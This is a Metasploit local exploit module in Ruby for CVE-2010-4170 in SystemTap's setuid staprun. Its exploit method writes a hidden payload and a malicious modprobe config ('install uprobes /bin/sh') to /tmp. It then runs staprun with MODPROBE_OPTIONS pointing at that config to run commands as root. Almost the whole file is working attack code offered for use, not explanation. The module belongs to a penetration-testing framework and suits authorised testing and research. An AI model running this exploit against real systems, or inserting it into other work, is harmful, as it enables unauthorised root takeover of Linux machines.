# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SystemTap MODPROBE_OPTIONS Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges by exploiting a
        vulnerability in the `staprun` executable included with SystemTap
        version 1.3.

        The `staprun` executable does not clear environment variables prior to
        executing `modprobe`, allowing an arbitrary configuration file to be
        specified in the `MODPROBE_OPTIONS` environment variable, resulting
        in arbitrary command execution with root privileges.

        This module has been tested successfully on:

        systemtap 1.2-1.fc13-i686 on Fedora 13 (i686); and
        systemtap 1.1-3.el5 on RHEL 5.5 (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Tavis Ormandy&#039;, # Discovery and exploit
          &#039;bcoles&#039;         # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2010-11-17&#039;,
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;44914&#039;],
          [&#039;CVE&#039;, &#039;2010-4170&#039;],
          [&#039;EDB&#039;, &#039;15620&#039;],
          [&#039;URL&#039;, &#039;https://securitytracker.com/id?1024754&#039;],
          [&#039;URL&#039;, &#039;https://access.redhat.com/security/cve/cve-2010-4170&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=653604&#039;],
          [&#039;URL&#039;, &#039;https://lists.fedoraproject.org/pipermail/package-announce/2010-November/051115.html&#039;],
          [&#039;URL&#039;, &#039;https://bugs.launchpad.net/bugs/677226&#039;],
          [&#039;URL&#039;, &#039;https://www.debian.org/security/2011/dsa-2348&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;STAPRUN_PATH&#039;, [true, &#039;Path to staprun executable&#039;, &#039;/usr/bin/staprun&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def staprun_path
    datastore[&#039;STAPRUN_PATH&#039;]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def check
    # On some systems, staprun execution is restricted to stapusr group:
    # ---s--x---. 1 root stapusr 178488 Mar 28  2014 /usr/bin/staprun
    unless cmd_exec("test -x &#039;#{staprun_path}&#039; && echo true").include? &#039;true&#039;
      vprint_error "#{staprun_path} is not executable"
      return CheckCode::Safe
    end
    vprint_good "#{staprun_path} is executable"

    unless setuid? staprun_path
      vprint_error "#{staprun_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{staprun_path} is setuid"

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 10..15}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    config_path = "#{base_dir}/#{payload_name}.conf"
    upload config_path, "install uprobes /bin/sh"

    print_status &#039;Executing payload...&#039;
    res = cmd_exec "echo &#039;#{payload_path}&&#039; | MODPROBE_OPTIONS=&#039;-C #{config_path}&#039; #{staprun_path} -u #{rand_text_alphanumeric 10..15}"
    vprint_line res
  end
end

